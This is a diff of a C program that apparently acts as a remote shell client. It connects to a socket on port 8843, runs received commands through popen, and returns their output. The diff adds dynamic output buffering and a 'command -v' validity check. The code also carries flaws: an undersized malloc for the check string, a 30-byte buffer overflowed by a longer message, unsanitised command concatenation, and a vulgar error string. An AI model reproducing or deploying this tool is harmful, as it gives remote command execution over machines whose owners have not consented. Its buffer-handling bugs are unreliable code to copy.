@@ -4,36 +4,76 @@
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <math.h>
 
 #define HOST "127.0.0.1"
 #define PORT 8843
 #define BUFFERSIZE 1024
 
-char* execute(char* command) {
-    char* output_string = malloc(BUFFERSIZE);
-    
-    if(strncmp(command, "cd ", 3) == 0 && strlen(command) >= 4) {
-        if(chdir(command + 3) == 0) strcpy(output_string, "Change directory successfull");
-        else strcpy(output_string, "Change directory not successfull");
-    } else { 
-        int length_counter = 0;
+/**
+ * Run command in subprocess and return its stdout
+ * @param command
+ * @return
+ */
+char* exec_subproc(char* command){
+    const int readbuffersize = 100;
+    const float growthfactor = 2;
 
-        FILE *fptr;
-        fptr = popen(command, "r");
+    int outputSize = 100;
+    char* output = malloc(sizeof(char) * outputSize);
+    int length_counter = 0;
 
-        /*if(fptr == NULL) {
-            strcpy(output_string, "Command unknown\n");
-            return output_string;
-        }*/
+    FILE *fptr;
+    fptr = popen(command, "r");
 
-        char output_buffer[BUFFERSIZE];
-        while((fgets(output_buffer, sizeof(output_buffer), fptr)) != NULL) {
-            strcpy(output_string + length_counter, output_buffer);
-            length_counter += strlen(output_buffer);
+    char output_buffer[readbuffersize];
+    while((fgets(output_buffer, sizeof(output_buffer), fptr)) != NULL) {
+        if(outputSize - length_counter < readbuffersize) {
+            outputSize = (int) ceil(outputSize * growthfactor);
+            output = realloc(output, outputSize);
         }
 
-        pclose(fptr);
-        fptr = NULL;
+        strcpy(output + length_counter, output_buffer);
+        length_counter += (int) strlen(output_buffer);
+    }
+
+    pclose(fptr);
+    fptr = NULL;
+
+    return output;
+}
+
+/**
+ * Handle handlercommands
+ * @param command
+ * @return
+ */
+char* execute(char* command) {
+    char* output_string;
+
+    if(strncmp(command, "cd ", 3) == 0 && strlen(command) >= 4) {
+        output_string = malloc(sizeof (char) * 30);
+        if(chdir(command + 3) == 0) strcpy(output_string, "Change directory successful");
+        else strcpy(output_string, "Change directory not successful");
+    } else {
+
+        //check validity of command
+        char check[] = "command -v ";
+        char* checkCommand = malloc((strlen(check) + strlen(command)) * sizeof(char));
+        strcpy(checkCommand, check);
+        strcat(checkCommand, command);
+        char* response = exec_subproc(checkCommand);
+
+        if(strlen(response) == 0){
+            //invalid command as per "command -v"
+            free(response);
+
+            output_string = malloc(38 * sizeof(char));
+            strcpy(output_string, "Command invalid; if not got suck dick");
+            return output_string;
+        }
+
+        output_string = exec_subproc(command);
     }
     return output_string;
 }
@@ -41,7 +81,7 @@ char* execute(char* command) {
 int main(void) {
     int sock_ret;
     struct sockaddr_in sock;
-    
+
     // Create Socket in memory
     sock_ret = socket(AF_INET, SOCK_STREAM, 0);
     if(sock_ret == -1) {
